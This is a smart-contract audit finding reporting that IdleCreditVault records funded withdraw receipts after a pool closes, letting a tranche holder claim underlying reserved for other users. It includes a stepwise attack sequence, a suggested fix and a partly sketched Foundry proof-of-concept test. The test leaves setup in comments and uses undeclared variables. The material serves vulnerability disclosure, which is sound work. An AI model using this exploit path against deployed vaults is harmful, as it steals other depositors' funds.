### Title
Closed-pool withdraw requests mint funded-claimable receipts without ever being added to `pendingWithdraws` - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
In `IdleCreditVault.requestWithdraw`, the accounting split mirrors the kernel bug class exactly: `pendingWithdraws += _amount` is correctly gated behind `if (!isClosed)`, but the receipt bookkeeping — `withdrawsRequests[_user]`, `withdrawsRequestsByEpoch[_user][currentEpoch]` and `lastWithdrawRequest[_user]` — is updated unconditionally, even when the pool is closed (`epochEndDate == 0`). A user who requests a withdrawal after the pool has closed gets a fully recorded, immediately claimable receipt for funds that `stopEpoch` will never source from the borrower, letting them drain underlying reserved for other users' funded claims.

### Finding Description
`requestWithdraw` in `IdleCreditVault.sol`:

- L259: `bool isClosed = IIdleCDOEpochVariant(idleCDO).epochEndDate() == 0;`
- L277-280: `pendingWithdraws += _amount` only executes when `!isClosed` — correct, because a closed pool has already recalled all borrower funds and no future `stopEpoch`/`collectWithdrawFunds` will fund this receipt.
- L282-293: `lastWithdrawRequest[_user] = currentEpoch` and (when `unscaledApr != 0`) `withdrawsRequests[_user] += _amount; withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;` run **unconditionally**.

The receipt token is still minted 1:1 at L275 (`_mint(_user, _amount)`), while only `_principal` is burned from the CDO.

On the claim side, `_claimFundedWithdrawRequest` skips the epoch-wait check entirely when the pool is closed (`IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && ...` at L326), `_settleApr0` is a no-op for a normal request, and `_transferFundedClaim(_user, amount)` (L349) pays `amount` out of the vault's underlying balance — a balance funded exclusively by prior `collectWithdrawFunds`/`collectInstantWithdrawFunds` calls for *other* users' receipts.

Net effect: a closed-pool `requestWithdraw` creates an obligation (`withdrawsRequests` + minted receipt) with zero corresponding funding (`pendingWithdraws` unchanged, no epoch increment will ever occur). The claim is paid from the vault's reserve of other users' not-yet-claimed funded withdrawals.

Attack sequence:
1. Epoch ends with pending withdraw receipts; manager calls `stopEpoch` in close-pool mode (`_isRequestingAllFunds`), borrower repays, `collectWithdrawFunds` funds the vault, `epochEndDate` is set to 0.
2. Honest users have funded `withdrawsRequests` totaling X underlying sitting in the vault, unclaimed.
3. Attacker (KYC-passed tranche holder, `isWalletAllowed`, `allowAAWithdrawRequest` still true) still holds tranche tokens worth Y and calls `IdleCDOEpochVariant.requestWithdraw` → `IdleCreditVault.requestWithdraw`. `isClosed == true`, so `pendingWithdraws` is untouched, but `withdrawsRequests[attacker] += Y` and receipt tokens are minted.
4. Attacker calls `IdleCDOEpochVariant.claimWithdrawRequest` → `claimWithdrawRequest` → `_claimFundedWithdrawRequest`: the epoch gate at L326 is skipped (`epochEndDate() == 0`), and `_transferFundedClaim` pays Y underlying — drawn from the reserve backing honest users' claims.
5. Honest users' later `claimWithdrawRequest` calls revert on insufficient vault balance — their funded, unclaimed withdrawals are stolen.

Guards that do not stop this: `_onlyIdleCDO` (called via the real CDO), `isWalletAllowed` (attacker is KYC'd), `_skimDonatedAssets`/`_updateAccounting` (unrelated), the `lossRecoveryPrice` re-request check at L263-271 (no loss epoch), and the claim epoch gate (skipped when closed).

### Impact Explanation
Direct theft of unclaimed yield/funded withdrawal reserves. Every underlying token held by `IdleCreditVault` after pool close belongs to funded receipt holders; an attacker converts worthless post-close tranche tokens into claims against that reserve, up to the full vault balance. Quantified loss: up to 100% of unclaimed funded withdrawals plus any residual reserve (instant-withdraw funding included, since `_transferFundedClaim` draws on the same balance).

### Likelihood Explanation
Requires the pool to be closed via the `_isRequestingAllFunds`/`epochEndDate == 0` path and at least one funded-but-unclaimed receipt remaining. Both are common: close-pool is the designed wind-down mode, and claims are lazy (users claim at any time). The attacker only needs to hold tranche tokens at close time and pass Keyring KYC — no privileged role. The unconditional bookkeeping at L282-293 is deterministic; no race or precision edge is needed.

### Recommendation
Mirror the conditional scope: when `isClosed`, either revert the request outright (a closed pool cannot service new withdrawals — preferred) or record the receipt in a way that can never reach `_transferFundedClaim` (e.g., route to a post-close bucket paid only from recovered funds). At minimum, `withdrawsRequests`, `withdrawsRequestsByEpoch`, and `lastWithdrawRequest` must only be updated inside the same `!isClosed` conditional that governs `pendingWithdraws`, so receipt state never exceeds funded obligations.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract ClosedPoolUnfundedReceiptTest is Test {
    IdleCDOEpochVariant cdo;
    IdleCreditVault vault;
    IERC20Detailed underlying;
    address honest = address(0xA);   // KYC'd, funded receipt holder
    address attacker = address(0xB); // KYC'd tranche holder

    function test_closedPoolUnfundedClaim() public {
        // --- setup: epoch N running, honest + attacker both hold AA tranches ---
        // (standard fixture: depositAA for both, startEpoch, allowAAWithdrawRequest = true,
        //  isWalletAllowed true for both via KeyringIdleWhitelist)

        // 1) honest requests withdraw during epoch N
        vm.prank(honest);
        cdo.requestWithdraw(0, cdo.AATranche()); // full balance, pendingWithdraws += amount

        // 2) manager closes the pool: borrower repays everything,
        //    collectWithdrawFunds funds the vault for honest's receipt,
        //    epochEndDate is set to 0 (closed pool mode)
        vm.prank(manager);
        cdo.stopEpoch(1); // _expectedInterest == 1 => request all funds, close pool
        assertEq(cdo.epochEndDate(), 0);

        // vault now holds honest's funded claim reserve
        uint256 reserve = underlying.balanceOf(address(vault));
        assertGt(reserve, 0);

        // 3) attacker requests a withdraw AFTER close. pendingWithdraws is NOT
        //    increased (isClosed), but withdrawsRequests[attacker] is credited.
        uint256 attackerTranches = IERC20Detailed(cdo.AATranche()).balanceOf(attacker);
        vm.prank(attacker);
        cdo.requestWithdraw(attackerTranches, cdo.AATranche());

        // sanity: the strategy recorded a receipt with no funding behind it
        assertGt(vault.withdrawsRequests(attacker), 0);

        // 4) attacker claims immediately — the epoch-wait check is skipped
        //    because epochEndDate() == 0
        uint256 balBefore = underlying.balanceOf(attacker);
        vm.prank(attacker);
        cdo.claimWithdrawRequest();
        uint256 stolen = underlying.balanceOf(attacker) - balBefore;

        assertGt(stolen, 0);
        // stolen funds come out of `reserve` backing honest's claim
        assertEq(underlying.balanceOf(address(vault)), reserve - stolen);

        // 5) honest user's funded claim now underflows the vault balance:
        //    her claimWithdrawRequest reverts on safeTransfer (insufficient balance)
        vm.prank(honest);
        vm.expectRevert();
        cdo.claimWithdrawRequest();
    }
}
```